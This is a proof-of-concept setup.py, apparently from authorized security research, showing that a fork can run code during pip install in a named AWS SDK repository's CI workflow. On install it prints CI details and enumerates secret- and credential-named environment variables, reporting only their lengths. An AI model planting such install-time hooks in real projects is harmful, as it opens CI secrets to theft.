"""
Security Research PoC - LOTP via setup.py
Target: aws/bedrock-agentcore-sdk-python integration-testing.yml
Author: Robert Prast - Authorized security research
"""
import os, datetime
from setuptools import setup, find_packages

print("=" * 60)
print("  LOTP PoC: Code execution from fork via pip install -e .")
print("  This file was NOT blocked by the safety check")
print("=" * 60)
print(f"Timestamp: {datetime.datetime.utcnow().isoformat()}")
print(f"Working Directory: {os.getcwd()}")
print(f"GITHUB_REPOSITORY: {os.environ.get('GITHUB_REPOSITORY', 'N/A')}")
print(f"GITHUB_RUN_ID: {os.environ.get('GITHUB_RUN_ID', 'N/A')}")
print(f"GITHUB_ACTOR: {os.environ.get('GITHUB_ACTOR', 'N/A')}")
print(f"RUNNER_NAME: {os.environ.get('RUNNER_NAME', 'N/A')}")
print()
print("AWS-related env vars present:")
for k, v in sorted(os.environ.items()):
    if any(x in k.upper() for x in ['AWS', 'OIDC', 'ROLE', 'CREDENTIAL']):
        print(f"  {k} = [SET, {len(v)} chars]")
print()
print("Secret/Token env vars present:")
for k, v in sorted(os.environ.items()):
    if any(x in k.upper() for x in ['SECRET', 'TOKEN', 'KEY', 'PASSWORD']):
        print(f"  {k} = [SET, {len(v)} chars]")
print("=" * 60)

setup(
    name="bedrock-agentcore-sdk",
    version="0.0.1-security-research",
    packages=find_packages(where="src") if os.path.isdir("src") else find_packages(),
    package_dir={"": "src"} if os.path.isdir("src") else {},
    python_requires=">=3.10",
)
